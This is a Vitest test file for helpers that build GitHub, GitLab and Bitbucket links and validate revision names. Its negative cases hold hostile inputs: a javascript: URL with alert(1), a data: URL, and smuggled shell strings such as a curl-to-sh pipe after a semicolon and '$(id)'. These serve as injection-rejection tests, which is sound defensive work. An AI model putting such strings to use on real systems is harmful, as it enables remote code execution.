import { describe, it, expect } from 'vitest';
import { detectScmHost, commitUrl, compareUrl, fileUrl, branchUrl, isPlainRevision } from '#shared/scm-urls';

describe('scm-urls', () => {
  it('detects the host from the repository URL', () => {
    expect(detectScmHost('https://github.com/acme/web')).toBe('github');
    expect(detectScmHost('https://gitlab.example.com/acme/web')).toBe('gitlab');
    expect(detectScmHost('https://bitbucket.org/acme/web')).toBe('bitbucket');
    expect(detectScmHost('https://git.acme.internal/acme/web')).toBeNull();
    expect(detectScmHost(null)).toBeNull();
    expect(detectScmHost('not a url')).toBeNull();
  });

  it('links only http and https repository URLs', () => {
    expect(detectScmHost('javascript://github.com/%0aalert(1)')).toBeNull();
    expect(commitUrl('javascript://github.com/%0aalert(1)', 'abc123')).toBeNull();
    expect(compareUrl('data://github.com/acme/web', 'a', 'b')).toBeNull();
    expect(detectScmHost('ssh://github.com/acme/web')).toBeNull();
    expect(detectScmHost('http://gitlab.internal/acme/web')).toBe('gitlab');
  });

  it('builds provider-specific commit URLs', () => {
    expect(commitUrl('https://github.com/acme/web', 'abc123')).toBe('https://github.com/acme/web/commit/abc123');
    expect(commitUrl('https://gitlab.com/acme/web', 'abc123')).toBe('https://gitlab.com/acme/web/-/commit/abc123');
    expect(commitUrl('https://bitbucket.org/acme/web', 'abc123')).toBe('https://bitbucket.org/acme/web/commits/abc123');
    // A trailing slash never doubles up.
    expect(commitUrl('https://github.com/acme/web/', 'abc123')).toBe('https://github.com/acme/web/commit/abc123');
    expect(commitUrl(null, 'abc123')).toBeNull();
    expect(commitUrl('https://example.com/acme/web', 'abc123')).toBeNull();
  });

  it('builds compare, file and branch URLs', () => {
    expect(compareUrl('https://github.com/acme/web', 'a', 'b')).toBe('https://github.com/acme/web/compare/a...b');
    expect(compareUrl('https://bitbucket.org/acme/web', 'a', 'b')).toBe(
      'https://bitbucket.org/acme/web/branches/compare/b..a#diff',
    );
    expect(fileUrl('https://github.com/acme/web', 'main', 'src/a.ts', 12)).toBe(
      'https://github.com/acme/web/blob/main/src/a.ts#L12',
    );
    expect(fileUrl('https://gitlab.com/acme/web', 'main', '/src/a.ts')).toBe(
      'https://gitlab.com/acme/web/-/blob/main/src/a.ts',
    );
    expect(branchUrl('https://github.com/acme/web', 'feat/x')).toBe('https://github.com/acme/web/tree/feat%2Fx');
  });
});

describe('isPlainRevision', () => {
  it('accepts commit SHAs and ref names', () => {
    for (const revision of [
      'a1b2c3d',
      'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0',
      'main',
      'release/1.2',
      'v1.2.0-rc_1',
    ]) {
      expect(isPlainRevision(revision), revision).toBe(true);
    }
  });

  it('refuses anything a shell or a URL would read as more than a revision', () => {
    for (const revision of [
      'main; curl -s https://x/p | sh; #',
      '--output=/tmp/x',
      'a..b',
      '$(id)',
      'a b',
      '',
      'x?y=1',
    ]) {
      expect(isPlainRevision(revision), revision).toBe(false);
    }
  });
});
